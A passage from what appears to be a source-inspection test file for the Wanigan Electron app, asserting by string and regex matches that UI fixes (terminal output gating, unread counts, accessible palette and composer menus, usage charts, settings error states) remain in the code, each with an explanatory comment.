  // viewMemory has no runtime assertion available here: there is no renderer
  // to mount, and all four of these are bugs that were invisible in review and
  // would be invisible again. Every one of the four fails against the file as
  // it stood before this change, so they are a ratchet rather than a snapshot.
  const viewMemorySrc = sourceOf('src/renderer/src/components/viewMemory.ts');
  const vmScrollWrites = viewMemorySrc.split('store.set(full, el.scrollTop)').length - 1;
  const vmScrollWriteAt = viewMemorySrc.indexOf('store.set(full, el.scrollTop)');
  const vmCleanupAt = viewMemorySrc.lastIndexOf('return () => {');
  const vmClaimAt = viewMemorySrc.indexOf('if (claimed.current !== view) {');
  const vmEffectAt = viewMemorySrc.indexOf('pendingUnmount.current = false;');
  check(viewMemorySrc.length > 1000
    && viewMemorySrc.includes('export function useRememberedScrollRef')
    && /const \[element, setElement\] = useState<HTMLElement \| null>\(null\)/.test(viewMemorySrc)
    && /useMemo<RefObject<HTMLElement \| null>>\(\(\) => \(\{ current: element \}\), \[element\]\)/.test(viewMemorySrc)
    && /useRememberedScroll\(ref, key\)/.test(viewMemorySrc),
  'a scroller that mounts after first paint is restorable at all: the callback ref puts the node in state, so the effect re-runs against an element that exists rather than the null a ref object silently filled in behind it');
  check(vmScrollWrites === 1 && vmScrollWriteAt > 0 && vmScrollWriteAt < vmCleanupAt
    && /return \(\) => \{[^}]*want = null;/.test(viewMemorySrc.slice(vmCleanupAt)),
  'the remembered offset has exactly one writer, the scroll listener: the cleanup disconnects and unsubscribes but saves nothing, so a StrictMode simulated unmount can no longer write a pre-restore 0 over the saved position and then restore it',
  `cleanup still saves; writes found: ${vmScrollWrites}`);
  check(viewMemorySrc.includes('const latest = useRef(value);')
    && viewMemorySrc.includes('latest.current = resolved;')
    && viewMemorySrc.includes('store?.set(full, resolved);')
    && !/setValue\(\(previous\)/.test(viewMemorySrc),
  'useViewMemory writes the store from the setter against a ref, not from inside a setState updater React discards when the component unmounts in the same tick — a filter changed by the click that also swapped tabs is still remembered');
  check(vmClaimAt > 0 && vmClaimAt < vmEffectAt
    && /if \(claimed\.current !== view\) \{\s*claimed\.current = view;\s*store\?\.scopeMounted\(view\);\s*\}/.test(viewMemorySrc),
  'a scope claims its view while it renders, ahead of the view below reading its keys in a useState initializer, so Reload after a crash hands the fresh instance a cleared scope instead of the state that broke it');

  check(/registerRunner\(\s*'batch'/.test(mainSrc),
    "the 'batch' queue kind has a runner — without one every batch schedule blocks on 'no runner registered' forever");
  check(/typeof p\.prompt === 'string'/.test(mainSrc),
    'the headless runner handles a schedule-shaped payload as well as a fan-out one');
  check(/handle\(\s*'worktrees:merge'/.test(mainSrc) && /merge:\s*\(/.test(preloadSrc),
    'worktrees:merge is registered and bound, so a fleet run can be landed from inside the app');
  check(!/mergeFn/.test(sessionsSrc),
    'and the probe that stood in for the missing channel is gone rather than left as a fallback');
  check(/handle\(\s*'observed:list'/.test(mainSrc) && /handle\(\s*'observed:state'/.test(mainSrc),
    'the observed lane has both channels — the list alone cannot tell "off" from "none running"');
  check(/handle\(\s*'egress:report'/.test(mainSrc) && /egress:/.test(preloadSrc),
    'the egress report has a channel and a binding');
  check(/handle\(\s*'notify:setWatchedSession'/.test(mainSrc) && /setWatchedSession/.test(preloadSrc)
    && /setWatchedSession\(tab === 'sessions'/.test(appSrc),
  'the renderer actually tells main which session is on screen, so a binding that suppresses redundant pings is not dead wiring');
  check(/handle\(\s*'mobile:status'/.test(mainSrc) && /handle\(\s*'mobile:configure'/.test(mainSrc)
    && /mobile:\s*\{/.test(preloadSrc),
  'the phone setup panel has status and configuration IPC on both sides of the sandbox');
  check(/configureSnapshotSource/.test(mainSrc) && /startMobileMonitor/.test(mainSrc)
    && /stopMobileMonitor/.test(mainSrc),
    'the phone monitor is attached to the GUI process that owns live PTYs and is stopped with its services');
  const recoveryWindow = mainSrc.indexOf('createWindow();\n    uiInitialized = true;');
  const recoveryServices = mainSrc.indexOf('const state = await startAttendedServices();');
  check(/handle\(\s*'startup:status'/.test(mainSrc) && /handle\(\s*'startup:retry'/.test(mainSrc)
    && recoveryWindow >= 0 && recoveryServices > recoveryWindow
    && mainSrc.includes('enterStartupRecovery(stage, error)')
    && /startup:\s*\{/.test(preloadSrc) && /startupChanged/.test(preloadSrc)
    && /startup\.status\(\)/.test(appSrc) && /Wanigan is open in recovery mode/.test(appSrc),
  'a partially migrated local database opens a recovery window with status and retry instead of rejecting startup before any UI exists');
  check(/handle\(\s*'settings:setTheme'/.test(mainSrc)
    // The generic bridge still goes through the validating setter; the handler
    // grew a body only so a stored sidebar answer can rebuild the View menu's
    // tick, and that body must not become a second way to write settings.
    && /handle\(\s*'settings:set'\s*,\s*\(key: string, value: string\)\s*=>\s*\{/.test(mainSrc)
    && mainSrc.includes('const next = setUserPreference(key, value);')
    && /setTheme:\s*\(theme: ThemeSetting\).*settings:setTheme/.test(preloadSrc)
    // The Theme select left the title row: Settings › App keeps the native
    // control, and the palette carries three "Appearance: …" actions that call
    // the same setter, so the setting is reachable without a title-bar widget.
    && appSrc.includes('useThemePreference') && !appSrc.includes('<ThemeControl')
    && appSrc.includes('title: `Appearance: ${word}`') && appSrc.includes('setTheme(value)')
    && settingsSrc.includes('ThemeControl')
    && themeSrc.includes("window.wanigan.prefs.setTheme(next)")
    && themeSrc.includes("window.matchMedia('(prefers-color-scheme: dark)')")
    && themeBootSrc.includes("root.dataset.theme = resolved")
    && cssSrc.includes(":root[data-theme='light']")
    && cssSrc.includes('--terminal-bg')
    && terminalPaneSrc.includes("window.addEventListener('wanigan:theme-changed'")
    && terminalPaneSrc.includes('term.options.theme = next')
    && terminalPaneSrc.includes("'(pointer: coarse)'")
    && terminalPaneSrc.includes('term.options.fontSize = next')
    && settingsSrc.includes('<Appearance preference={themePreference}'),
  'the shell has a validated durable system/light/dark preference, semantic palette tokens, and terminal repaint/readable touch sizing without replacing a live session');
  check(appSrc.includes('const requestNewSession')
    && appSrc.includes('className="nav-new-session"')
    && appSrc.includes('newSessionRequest={newSessionRequest}')
    && appSrc.includes('onNewSessionRequestConsumed={consumeNewSessionRequest}')
    // The palette became a command list, so "new session" is one entry that
    // runs after the palette closes. staysPut carries the old closePalette(false)
    // intent: an action that opens a dialog must not hand focus back to the
    // opener it just replaced.
    && appSrc.includes('run: requestNewSession')
    && appSrc.includes('onRun={(item) => { closePalette(item.staysPut === true); item.run(); }}')
    && sessionsSrc.includes('onNewSessionRequestConsumed')
    && sessionsSrc.includes('setDialog(true);')
    && cssSrc.includes('.nav-new-session') && cssSrc.includes('.command-item-primary'),
  'the header and command palette start one explicit interactive session from any view without leaving an old dialog request behind');
  check(appSrc.includes('<ProviderUsageBadge session={activeSession} providers={providers} />')
    && !appSrc.includes('CodexStatusBadge')
    && appSrc.includes('selectedProviderStatus(session, providers)')
    && appSrc.includes('window.wanigan.usage.session(session.id)')
    && appSrc.includes('window.wanigan.codex.status(force)')
    && appSrc.includes('requestEpoch.current')
    && appSrc.includes('epoch !== requestEpoch.current')
    && cssSrc.includes('.nav-usage-status') && !cssSrc.includes('.nav-codex-status'),
  'the header keys provider data to the selected session, uses Codex account limits only on Codex, and ignores stale provider replies after a switch');
  // Scout moved out of Learning and became a top-level destination: it talks to
  // window.wanigan.scout, shares no table or IPC namespace with learning, and
  // proposes product improvements from public sources rather than recording
  // knowledge from your own sessions. The safety properties below are unchanged
  // and are the reason this assertion exists — only its host moved.
  check(routesSrc.includes("id: 'scout'")
    && appSrc.includes('<ImprovementScout projects={projects} onOpenGoal={openGoal} />')
    && !learningSrc.includes('ImprovementScout')
    && scoutViewSrc.includes("allowNetwork: true")
    && scoutViewSrc.includes("mode === 'manual'")
    && scoutViewSrc.includes('Preview locally')
    && scoutViewSrc.includes('Create linked Goal')
    && scoutViewSrc.includes('target="_blank" rel="noreferrer"')
    && scoutViewSrc.includes('networkEnabled') && scoutViewSrc.includes('weeklyEnabled')
    && !scoutViewSrc.includes('window.wanigan.control.create')
    && !scoutViewSrc.includes("goal_created")
    && scoutCssSrc.includes('@media (pointer: coarse)')
    && scoutCssSrc.includes('min-height: 44px')
    && scoutCssSrc.includes('.scout-view'),
  'Scout is a touch-safe top-level surface with a hard local preview, one explicit online action, separate unattended-network consent, cited external links, and a Control Goal handoff');
  // The proposal queue is a list, not an announcement. The results section was
  // aria-live, so a first load, a broadened filter, a reorder and every status
  // change read up to 150 proposals aloud — each one's title, summary, four
  // reason codes and five button labels. A reader who moved one proposal to
  // "reviewed" was told about the other hundred. What actually changed is a
  // count, so one sentence beside the filter controls that change it is the
  // announced channel, and the heading holds the total a scan changes.
  check(!scoutViewSrc.includes('aria-live')
    && scoutViewSrc.includes('<section className="scout-results">')
    && scoutViewSrc.includes('<p className="scout-filter-status" role="status">{filterStatus}</p>')
    && scoutViewSrc.includes('<h3>{suggestions.length} proposal')
    && /if \(loading\) return 'Reading local Scout records/.test(scoutViewSrc)
    && scoutViewSrc.includes("if (suggestions.length === 0) return 'Nothing proposed yet.'")
    && scoutViewSrc.includes("if (filteredSuggestions.length === 0) return 'No proposal matches these filters.'")
    && scoutCssSrc.includes('.scout-filter-status'),
  'the Scout queue announces one count sentence beside its filters — loading, nothing proposed, no match, or filtered of total — instead of speaking every proposal article on load, filter, reorder and status change');

  // Command-K used to introduce a second kind of record for one table ("Goals
  // and dockets"), and to answer a search for "worktrees" with Git, which has
  // no worktree UI at all — those controls are the Worktrees row in Settings.
  // filterPalette tests title + hint + keywords as one string and leaves the
  // survivors in table order, so the stale word had to leave both halves of
  // the Git row, not just the keywords; "working tree" is two words on purpose
  // and matches nothing.
  check(routesSrc.includes("hint: 'Goals — a contract, a task graph, evidence and your decision'")
    && routesSrc.includes("hint: 'History, working tree, branches, stashes and the review gate for one repository'")
    && !/keywords: '[^']*worktree/.test(routesSrc)
    && !/hint: '[^']*[Dd]ocket/.test(routesSrc),
  'the palette calls Control’s record a goal, and no route row claims worktrees, so searching for one lands in Settings rather than on a Git view that cannot show it');
  check(appSrc.includes('aria-modal="true"')
    && appSrc.includes('const focusable = Array.from(dialog.current')
    // Opener restoration is explicit now rather than incidental: closing has to
    // hand focus back to the control that opened it, not drop it on the body.
    && appSrc.includes('const opener = paletteOpenerRef.current')
    && appSrc.includes('opener?.focus()')
    // Reaching the third result used to cost three Tabs. The highlight moves on
    // arrow keys and is published to assistive tech, while focus stays in the
    // field so typing never stops mid-search.
    && appSrc.includes("if (e.key === 'ArrowDown')")
    && appSrc.includes('aria-activedescendant={active >= 0')
    // The list is a roving tabindex, so it is one tab stop rather than fifteen.
    && appSrc.includes('tabIndex={roving === id ? 0 : -1}')
    && appSrc.includes("aria-current={railHasActiveTab ? undefined : 'page'}")
    // Off-list views are reachable and are labelled with a real shortcut where
    // one exists rather than a blank column. Nothing is off the list any more,
    // but the palette must stay truthful if a route is added and ungrouped.
    && appSrc.includes('meta: TAB_SHORTCUTS[item.id].label'),
  'the keyboard palette traps focus, moves an announced highlight on arrow keys and restores its opener, while navigation remains reachable and truthful on Views-only routes');

  // The composer's $ menu was a listbox that owned no options — role="option"
  // sat on a button inside a listitem, two roles below the list — and the
  // textarea said nothing about it at all, so a screen reader heard a plain
  // text box while Enter had quietly stopped meaning send. A textarea cannot
  // be the combobox this pattern usually is (implicit role textbox, no role
  // change permitted, aria-expanded unsupported), so the wiring is the two
  // attributes a textbox does support, over a list that is always in the DOM
  // so the id they name always resolves.
  const composerSrc = sourceOf('src/renderer/src/components/Composer.tsx');
  const composerCssSrc = sourceOf('src/renderer/src/styles/composer.css');
  // The live region below is hidden by .sr-only, which is a shared primitive in
  // ui.css rather than a per-surface copy. composer.css used to carry its own
  // .composer-sr with a byte-equivalent body, and evals.css a third under
  // .skills-sr; one hiding technique defined in three places is three places to
  // fix when it changes. The check still proves the class the element names is
  // really defined somewhere — a live region hidden by a class that does not
  // exist is a visible paragraph.
  const uiCssSrc = sourceOf('src/renderer/src/styles/ui.css');
  const composerMenuBlock = composerSrc.slice(
    composerSrc.indexOf('<ul id="composer-skill-menu"'),
    composerSrc.indexOf('</ul>'),
  );
  check(composerSrc.includes('aria-controls="composer-skill-menu"')
    && composerSrc.includes('aria-activedescendant={menu && menuOptions.length ? `composer-skill-${menu.index}` : undefined}')
    // The two an invalid fix would reach for, and a textbox supports neither.
    && !composerSrc.includes('role="combobox"')
    && !composerSrc.includes('aria-expanded={menu')
    // Rendered even when empty, so aria-controls never points at nothing.
    && composerSrc.includes('<ul id="composer-skill-menu"')
    && composerSrc.includes('hidden={!menu || menuOptions.length === 0}')
    // The option is the li itself; nothing stands between listbox and option.
    && /<li key=\{option\.invoke\}[\s\S]{0,200}role="option"/.test(composerSrc)
    && composerMenuBlock.length > 0
    && !composerMenuBlock.includes('<button')
    // Focus stays in the textarea, or aria-activedescendant names nothing.
    && composerMenuBlock.includes('onMouseDown={(e) => e.preventDefault()}')
    && composerMenuBlock.includes('onClick={() => insertSkill(option)}')
    // The count and the changed Enter, which no ARIA attribute carries.
    && composerSrc.includes('<p className="sr-only" role="status">')
    && composerSrc.includes("`${menuOptions.length} skill${menuOptions.length === 1 ? '' : 's'} match")
    && composerCssSrc.includes('.composer-menu[hidden] { display: none; }')
    && uiCssSrc.includes('.sr-only {')
    && !composerCssSrc.includes('.composer-sr {'),
  'the composer announces its skill menu: textbox-legal aria-controls and aria-activedescendant over a list that is always in the DOM, options owned directly by the listbox with focus kept in the textarea, and a live region for the count and the changed meaning of Enter');

  // Two accounts is the whole point of the accounts feature, and an exhausted
  // window on one of them is exactly when it pays off. The page holds both live
  // readings; it must compare like with like — same window kind, same model
  // scope — and say nothing unless one really is at 100% and another really has
  // room.
  check(usageViewSrc.includes('const relief = useMemo(')
    && usageViewSrc.includes("const key = (w: LimitWindow) => `${w.kind}:${w.scope ?? 'all'}`")
    && usageViewSrc.includes('if (window.usedPercent < 100) continue;')
    && usageViewSrc.includes('.filter((w) => key(w) === key(window) && w.usedPercent < 100)')
    && usageViewSrc.includes('if (alternatives.length === 0) continue;')
    && usageViewSrc.includes('{relief.length > 0 && ('),
  'an exhausted limit window names the other account that still has room on the same window, and says nothing when there is none');

  // The Usage page opened on a 14-day window while its picker offered 7, 30 and
  // 90. A <select> whose value matches no <option> renders with nothing
  // selected, so the control sat blank above a heading that read "last 14
  // days" — two halves of one screen, neither of which could be believed about
  // which window the figures below covered. This parses both halves rather than
  // matching a phrase, so it fails again the moment the list and the default
  // drift apart.
  const usageWindowList = /const WINDOWS = \[([\d,\s]+)\];/.exec(usageViewSrc);
  const usageWindowDefault = /const DEFAULT_WINDOW = (\d+);/.exec(usageViewSrc);
  const usageWindowsOffered = (usageWindowList?.[1] ?? '')
    .split(',').map((n) => Number(n.trim())).filter((n) => n > 0);
  check(usageWindowList !== null && usageWindowDefault !== null
    && usageWindowsOffered.includes(Number(usageWindowDefault?.[1]))
    // The window is view memory now, so it survives a tab swap; what this pins
    // is unchanged either way — whatever the page opens on has to be a value
    // the picker can display, or the select renders blank above a heading that
    // names a span nothing on screen agrees with.
    && usageViewSrc.includes("useViewMemory<number>('days', DEFAULT_WINDOW)")
    && usageViewSrc.includes('{WINDOWS.map((value) => <option key={value} value={value}>Last {value} days</option>)}'),
  'the consumption window Usage opens on is one its picker can display, so the select and the heading name the same window',
  `offers ${usageWindowsOffered.join(', ')}; opens on ${usageWindowDefault?.[1] ?? 'nothing'}`);

  // The chart's rules belong in a sheet, themed by token. usage.css is also
  // where the specificity trap is handled: .viz-table th in index.css is
  // (0,1,1) and aligns left, so a bare .u-th-r would silently lose and the
  // model columns would drift back to the left edge of their numbers.
  const usageCssSrc = sourceOf('src/renderer/src/styles/usage.css');
  check(usageViewSrc.includes("import '../styles/usage.css';")
    && usageCssSrc.includes('.u-s1 { background: var(--series-1); }')
    && usageCssSrc.includes('.u-s4 { background: var(--series-4); }')
    && usageCssSrc.includes('.viz-table th.u-th-r { text-align: right; }')
    && !/#[0-9a-f]{3,8}\b/i.test(usageCssSrc)
    && !/\bfont(?:-size)?:\s*[^;{}]*?[0-9]*\.?[0-9]+px\b/.test(usageCssSrc),
  'the Usage chart rules live in styles/usage.css, draw their series from the themed tokens, and spell no colour or font size of their own');

  // The daily chart carried its whole meaning in colour, and only in colour:
  // six hues — --accent, --codex and four raw hex literals that were the
  // dark-theme values in both themes — over an unnamed stack of empty divs
  // whose day dimension appears nowhere else on this screen and was reachable
  // only by hovering a fourteen-pixel column. The bars now carry a name, the
  // series are the four themed --series-* tokens worn as classes, and the same
  // figures are laid out as a table underneath, so a reader who cannot see the
  // picture — or cannot separate its hues — still gets the record.
  check(usageViewSrc.includes('className="u-bars" role="img"')
    && usageViewSrc.includes('aria-label={`Tokens per day for ${accountLabel}, ${span}, stacked by model.')
    && usageViewSrc.includes('<details className="u-days">')
    && usageViewSrc.includes('<summary>Day by day</summary>')
    && usageViewSrc.includes('{models.map((model) => <th key={model} className="u-th-r">{model}</th>)}')
    && usageViewSrc.includes('{fmt.format(totals[dayIndex])}</td>')
    && usageViewSrc.includes("const SERIES = ['u-s1', 'u-s2', 'u-s3', 'u-s4'];")
    && !/#[0-9a-f]{3,8}\b/i.test(usageViewSrc),
  'the Usage daily chart has an accessible name and a day-by-day table beneath it, and picks no colour of its own');

  // The advice above names a control, so the control has to exist. It did not:
  // accounts:setForProject was registered in main and bound in the preload and
  // no renderer ever called it, which left "pin this repo to that login" as a
  // capability the app had and never offered.
  check(/handle\(\s*'accounts:setForProject'/.test(mainSrc)
    && /setForProject:\s*\(/.test(preloadSrc)
    && settingsSrc.includes('window.wanigan.accounts.setForProject(project.id, PROJECT_ACCOUNT_HARNESS, accountId)')
    && settingsSrc.includes('window.wanigan.accounts.forProject(p.id, PROJECT_ACCOUNT_HARNESS)')
    // Below two accounts the control offers a choice that does not exist.
    && settingsSrc.includes('{accountRows.length > 1 && (')
    && settingsSrc.includes("{pinErr === null ? 'Follow the default' : 'Not read'}")
    // A swallowed pin read used to render as "Follow the default", which is a
    // real and different answer — and one the operator can act on by writing a
    // genuine un-pin over a pin that was there all along.
    && settingsSrc.includes('const [pinErr, setPinErr]')
    && settingsSrc.includes('disabled={pinErr !== null}')
    // Clearing is not the same as choosing the current default: the default can
    // change, and a project that never chose should follow it when it does.
    && settingsSrc.includes('e.target.value || null'),
  'a project can be pinned to a Claude account from Settings › Projects, cleared back to the default, and the picker is hidden when there is only one account');

  // The same bug class as pinErr, three panels further up, and it was worse:
  // the spend cap was seeded with a literal '1.00' and its read swallowed its
  // own rejection, so an unread cap rendered as a real one and Save wrote that
  // invention over the stored value — including a deliberate 0, which is how
  // the cap is switched off. `Number(cap) || 0` mapped a cleared or mistyped
  // box onto that same 0, so a typo read as a decision.
  check(settingsSrc.includes("const [cap, setCap] = useState<string | null>(null)")
    && !settingsSrc.includes("useState('1.00')")
    && settingsSrc.includes('const [capError, setCapError]')
    && settingsSrc.includes('const capUsable = Number.isFinite(capNumber) && capNumber >= 0')
    // The old coercion, matched as code rather than as text: the sentence
    // above capNumber explains why `Number(cap) || 0` was wrong, and a check
    // that forbids the string anywhere would forbid its own explanation.
    && !settingsSrc.includes('setSpendCap(Number(cap) || 0)')
    && settingsSrc.includes('setSpendCap(capNumber)')
    && settingsSrc.includes('disabled={!capUsable}')
    && settingsSrc.includes('<Reading what="the saved spend cap" />'),
    'an unread spend cap renders as unread rather than as $1.00, and there is no Save button to press until a real cap has come back from main');

  // A swallowed key-status read left the panel rendering "No … key stored",
  // which is a real and different answer — and one the operator acts on by
  // pasting a second key over a first that was there all along.
  check(!/key\.provider\('(glm|deepseek)'\)\.then\(set\w+\)\.catch\(\(\) => \{\}\)/.test(settingsSrc)
    && settingsSrc.includes('const [glmStatusError, setGlmStatusError]')
    && settingsSrc.includes('const [deepseekStatusError, setDeepseekStatusError]')
    && settingsSrc.includes('<Reading what="the stored Z.ai Coding Plan key" />')
    && settingsSrc.includes('<Reading what="the stored DeepSeek key" />'),
    'a provider key status that could not be read says so, instead of rendering as "no key stored"');

  // Fleet's second tile said "Needs you" and counted only the agents blocked on
  // a permission prompt, while the rail's "n need you" mark counts those plus
  // the failed and the finished. Both numbers were right and they were on
  // screen together under the same words. The count stays narrow because
  // pressing the tile filters to `permission`, so the label has to say which
  // set it counts and the sub-line has to name the remainder.
  check(fleetViewSrc.length > 500
    && !/<Stat label="Needs you"/.test(fleetViewSrc)
    && fleetViewSrc.includes('<Stat label="Asking permission"')
    && fleetViewSrc.includes('value={<>{blocked.length > 0 && <span aria-hidden="true">? </span>}{num(blocked.length)}</>}')
    && fleetViewSrc.includes('const blocked = useMemo(')
    && fleetViewSrc.includes("attention[s.id]?.kind === 'permission'")
    // The rest of the rail's total is named on the tile rather than left as an
    // unexplained gap between two visible numbers.
    && fleetViewSrc.includes('const reviewable = (counts.error ?? 0) + (counts.finished ?? 0);')
    && fleetViewSrc.includes('failed or finished')
    // And the wider set really is wider: if the rail ever narrows to permission
    // alone, this tile's careful wording becomes the confusing one.
    && appSrc.includes("const NEEDS_YOU: AttentionKind[] = ['permission', 'error', 'finished'];"),
  'the Fleet tile is labelled by what it actually counts — the agents asking permission — and names the failed and finished that the rail\'s wider "n need you" total also carries');

  // A live agent does not stop printing because you stepped over to Git, and
  // the only subscription that wrote its bytes into the terminal used to live
  // inside the Sessions view — which App.tsx unmounts on every tab change.
  // Everything printed while you were away was dropped, and unrecoverably: the
  // pane primes from main's ring buffer exactly once, so coming back showed a
  // terminal silently missing output. Main was never the problem; nobody was
  // listening.
  check(terminalPaneSrc.includes('export function startTerminalOutputPump()')
    && terminalPaneSrc.includes("window.wanigan.on.data(({ sessionId, data }) => feed(sessionId, data))")
    && terminalPaneSrc.includes('window.wanigan.on.exit(')
    && appSrc.includes('useEffect(() => startTerminalOutputPump(), [])')
    // The view writes no bytes, and no longer counts either: the unread
    // accounting moved to main, which can see output arrive while this view is
    // unmounted — the only stretch a badge is for.
    && !sessionsSrc.includes('feed(sessionId, data)')
    && !sessionsSrc.includes('import TerminalPane, { feed,'),
  'terminal output is pumped for the window’s lifetime rather than the Sessions view’s, so bytes printed while you are on another tab still land');

  // A pane primes from main's ring buffer on mount, and main appends every
  // chunk to that buffer before it broadcasts the chunk. So anything printed
  // during the mount round trip used to arrive twice — once through the live
  // pump, once inside the primed buffer — and because TUI output carries
  // cursor addressing, the second copy repaints against a screen that no
  // longer matches it.
  check(terminalPaneSrc.includes('if (!entry || entry.priming) return;')
    && terminalPaneSrc.includes('entry.priming = true;')
    && terminalPaneSrc.includes('if (pool.get(sessionId) !== pane) return;')
    && terminalPaneSrc.includes('if (buf) pane.term.write(buf);'),
  'a terminal drops broadcast chunks only while its one scrollback prime is in flight, so bytes that land during the mount round trip are written once — by the buffer that already carries them — instead of twice',
  `entry.priming mentions: ${terminalPaneSrc.split('entry.priming').length - 1}`);

  // The gate's own failure mode is worse than the bug it closes: a pane left
  // priming forever writes nothing again for the life of the session, and a
  // scrollback that rejects is exactly when that would happen.
  check(terminalPaneSrc.includes('if (pool.get(sessionId) === pane) finishPrime(pane);')
    && terminalPaneSrc.split('finishPrime(pane)').length - 1 === 2
    && terminalPaneSrc.includes('pane.priming = false;'),
  'a refused scrollback opens the gate it shut, so a pane whose history could not be read still shows everything the agent prints after that',
  `finishPrime call sites: ${terminalPaneSrc.split('finishPrime(pane)').length - 1}`);

  // Negative, and the one that catches a revert: both one-liners this replaced
  // are short enough to come back as a "tidy-up" without anyone noticing.
  check(!terminalPaneSrc.includes('pool.get(sessionId)?.term.write(data)')
    && !terminalPaneSrc.includes('.then((buf) => { if (buf) entry!.term.write(buf); })')
    && !terminalPaneSrc.includes('.catch(() => {});'),
  'neither the ungated one-line feed nor the one-line prime that swallowed its own failure is still in the file, so reverting the duplicate-write fix cannot pass as a reformat',
  `ungated feed present: ${terminalPaneSrc.includes('pool.get(sessionId)?.term.write(data)')}`);

  // The exited line is composed by this window, not broadcast by main, so no
  // ring buffer would replay it if the prime gate simply dropped it — and
  // writing it immediately put it above the history instead of after it.
  check(terminalPaneSrc.includes('function feedLocal(sessionId: string, text: string)')
    && terminalPaneSrc.includes('if (entry.priming) entry.pendingLocal.push(text);')
    && terminalPaneSrc.includes('for (const text of pane.pendingLocal.splice(0)) pane.term.write(text);')
    && terminalPaneSrc.includes('feedLocal(sessionId, `\\r\\n\\x1b[38;5;244m── session exited'),
  'the "session exited" line this window composes waits for a prime instead of being dropped by it, and lands after the restored history rather than above it',
  `pendingLocal mentions: ${terminalPaneSrc.split('pendingLocal').length - 1}`);

  // Negative: the gate is only worth having if broadcast bytes cannot walk
  // around it through the queue that exists for this window's own text.
  check(terminalPaneSrc.includes('window.wanigan.on.data(({ sessionId, data }) => feed(sessionId, data))')
    && !terminalPaneSrc.includes('feedLocal(sessionId, data)'),
  'broadcast PTY bytes still go through the gated feed() rather than the local queue, so the pump cannot reintroduce the double write by routing around the gate',
  `feedLocal mentions: ${terminalPaneSrc.split('feedLocal').length - 1}`);

  // bumpUnread sat in main from the initial commit with no caller, and
  // sessions:markRead zeroed a field nothing had ever raised, because the count
  // was really being kept in the Sessions view — the one place that cannot see
  // what it is counting, since App.tsx unmounts it on every tab change. Main
  // sees every chunk whatever tab is on screen and is told which session that
  // is, so it owns both halves now.
  const sessionsMainSrc = sourceOf('src/main/sessions.ts');
  check(sessionsMainSrc.split('bumpUnread').length - 1 >= 2
    && sessionsMainSrc.includes("broadcast('session:unread'")
    && sessionsMainSrc.includes('export function setFocusedSession')
    && mainSrc.includes('setFocusedSession(sessionId)')
    && preloadSrc.includes("ipcRenderer.on('session:unread'")
    // The whole session list must not be pushed per burst of PTY output: the
    // channel carries the counts that moved, and nothing else.
    && !sessionsMainSrc.includes("s.meta.unread = 0; broadcast('session:list'"),
  'the unread count is kept by the process that sees the output, and a change to it pushes the counts that moved rather than re-broadcasting every session row per burst of PTY output',
  `bumpUnread mentions: ${sessionsMainSrc.split('bumpUnread').length - 1}`);

  // Negative on the renderer half: the view must not keep a second, private
  // count. Two counters for one number is how the badge came to survive
  // leaving the view while counting nothing during the trip.
  check(!sessionsSrc.includes('unreadPending')
    && sessionsSrc.includes('window.wanigan.on.unread(')
    && sessionsSrc.includes('applyUnreadCounts(')
    && sessionsSrc.includes('window.wanigan.sessions.markRead(id)'),
  'the Sessions view keeps no private unread tally beside main’s, and clearing a badge is a real write rather than a local repaint over a number nobody owned',
  `unreadPending present: ${sessionsSrc.includes('unreadPending')}`);

  // The number is seconds in which output arrived, not messages waiting. "3
  // unread" beside a chat-shaped list is read as three things to read; it never
  // was that, and one of them cannot even be opened separately.
  check(!fleetViewSrc.includes('} unread')
    && fleetViewSrc.includes('while this session was not on screen')
    && sessionsSrc.includes('Output arrived ${s.unread} times while this session was not on screen'),
  'neither surface calls a count of output-seconds a count of unread messages, and the digit on the badge carries the sentence that says what it counted',
  `fleet still says unread: ${fleetViewSrc.includes('} unread')}`);

  // Two always-mounted shell polls kept working behind a hidden window: a
  // six-second badge tick that makes three IPC round trips a beat, and a
  // thirty-second branch refresh that handed `setProjects` a brand-new array
  // every time — re-rendering every view that takes `projects` as a prop for a
  // list that had not changed. Chromium only throttles a hidden renderer's
  // timers after about five minutes, so the guard is what buys the first five.
  // Neither guard is allowed to cost freshness: one visibilitychange listener
  // catches both polls up on return, so a restored window never shows a stale
  // count or a stale branch.
  check(appSrc.includes('const t = setInterval(() => { if (document.hidden) return; void tick(); }, 6000);')
    && appSrc.includes('const t = setInterval(() => { if (document.hidden) return; refreshProjects(); }, 30_000);')
    && appSrc.includes('const onVisible = () => { if (document.hidden) return; void tick(); refreshProjects(); };')
    && appSrc.includes("document.addEventListener('visibilitychange', onVisible);")
    && appSrc.includes("document.removeEventListener('visibilitychange', onVisible)")
    // And the refresh compares before it sets, so an unchanged list keeps the
    // array identity every consumer re-renders on.
    && appSrc.includes('projectShape(prev) === projectShape(list) ? prev : list')
    && !appSrc.includes('window.wanigan.projects.refresh().then(setProjects)'),
  'the shell’s badge and branch polls stop while the window is hidden, one visibilitychange listener catches both up on return, and an unchanged project list keeps its array identity');

  // The Git diff pane kept whatever patch it was holding when an action changed
  // the tree beneath it: stage a file and it still showed the unstaged diff,
  // commit or discard it and it still showed a patch for a path git no longer
  // lists — a diff for a state the repository is not in, which reads exactly
  // like a current one. `load` now hands its status back so the reconcile can
  // resolve the selected path against the state that action actually produced,
  // and clear the pane when the path is gone. The commit message is cleared
  // with the project for the same reason: a sentence drafted about one
  // repository's changes must not be waiting in the box over another's tree.
  const gitViewSrc = sourceOf('src/renderer/src/views/Git.tsx');

  // Two surfaces name this view: the page head a person reads on arrival, and
  // the palette hint they search to get there. They are not one string — a head
  // may say what a hint must not, and this head adds that Wanigan only reads the
  // repository until a button is pressed — but they must not describe different
  // views, and the palette hint is MATCHED, not merely printed, so a word that
  // drifts out of it stops being a way to find this screen. What is pinned is
  // the list of things both promise, not the sentence either wraps it in.
  const gitNouns = ['working tree', 'branches', 'stashes', 'review gate'];
  const gitLead = /lead="([^"]+)"/.exec(gitViewSrc)?.[1] ?? '';
  const gitHint = /\{ id: 'git',[^}]*hint: '([^']+)'/.exec(routesSrc)?.[1] ?? '';
  check(gitLead.length > 0 && gitHint.length > 0
    && gitNouns.every((noun) => gitLead.toLowerCase().includes(noun) && gitHint.toLowerCase().includes(noun))
    && /histor/i.test(gitLead) && /histor/i.test(gitHint)
    && !/worktree/i.test(gitHint),
    'the Git page head and the Git palette hint name the same five things this view holds, so neither can be rewritten into a description of a different screen, and the hint still does not claim the worktree UI that lives in Settings',
    JSON.stringify({ lead: gitLead.slice(0, 70), hint: gitHint.slice(0, 70) }));
  check(gitViewSrc.length > 500
    && gitViewSrc.includes('await syncSelection(await load())')
    && gitViewSrc.includes('function findFile(status: Status, path: string)')
